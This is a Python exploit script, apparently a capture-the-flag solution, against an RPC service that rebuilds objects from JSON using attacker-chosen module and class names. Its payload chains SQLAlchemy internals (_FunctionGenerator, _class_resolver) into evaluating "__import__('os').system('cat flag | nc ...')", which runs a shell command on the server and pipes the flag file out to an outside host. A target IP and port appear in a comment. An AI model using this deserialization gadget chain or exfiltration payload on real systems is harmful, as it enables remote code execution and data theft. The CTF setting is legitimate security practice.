#!/usr/bin/env python3

import sys
import json
import asyncio
import importlib

# from sqlalchemy import *

class AtelierException:
    def __init__(self, e):
        self.message = repr(e)

class MaterialRequest:
    pass

class MaterialRequestReply:
    pass

class RecipeCreateRequest:
    def __init__(self, materials):
        self.materials = materials

class RecipeCreateReply:
    pass

def object_to_dict(c):
    res = {}
    res["__class__"] = str(c.__class__.__name__)
    res["__module__"] = str(c.__module__)
    res.update(c.__dict__)
    return res

def dict_to_object(d):
    if "__class__" in d:
        class_name = d.pop("__class__")
        module_name = d.pop("__module__")
        module = importlib.import_module(module_name)
        class_ = getattr(module, class_name)

        inst = class_.__new__(class_)
        inst.__dict__.update(d)
    else:
        inst = d

    return inst

async def rpc_client(message):
    message = json.dumps(message, default=object_to_dict)
    print("====================")
    print(message)
    print("====================")
    #message = """{"__class__": "aaa", "__module__": ".flag"}"""

    reader, writer = await asyncio.open_connection(sys.argv[1], int(sys.argv[2]))
    writer.write(message.encode())
    data = await reader.read(2000)
    writer.close()

    print("=====================")
    print(data)
    print("=====================")

    res = json.loads(data, object_hook=dict_to_object)
    if isinstance(res, AtelierException):
        print("Exception: " + res.message)
        exit(1)

    return res

async def rpc_client_raw(message):
    print("====================")
    print(message)
    print("====================")

    reader, writer = await asyncio.open_connection(sys.argv[1], int(sys.argv[2]))
    writer.write(message.encode())
    data = await reader.read(2000)
    writer.close()

    print("=====================")
    print(data)
    print("=====================")

    res = json.loads(data, object_hook=dict_to_object)
    if isinstance(res, AtelierException):
        print("Exception: " + res.message)
        exit(1)

    return res

# 35.194.97.194 10000
loop = asyncio.get_event_loop()
res = loop.run_until_complete(rpc_client_raw("""{
    "__module__": "__main__",
    "__class__": "RecipeCreateRequest",
    "materials": {
        "__module__": "__main__",
        "__class__": "RecipeCreateRequest",
        "split": {
            "__module__": "sqlalchemy.sql.functions",
            "__class__": "_FunctionGenerator",
            "opts": {
                "__module__": "__main__",
                "__class__": "RecipeCreateRequest",
                "copy": {
                    "__module__": "sqlalchemy.ext.declarative.clsregistry",
                    "__class__": "_class_resolver",
                    "arg": "__import__('os').system('cat flag | nc <REDACTED>')",
                    "_dict": {}
                }
            }
        }
    }
}"""))
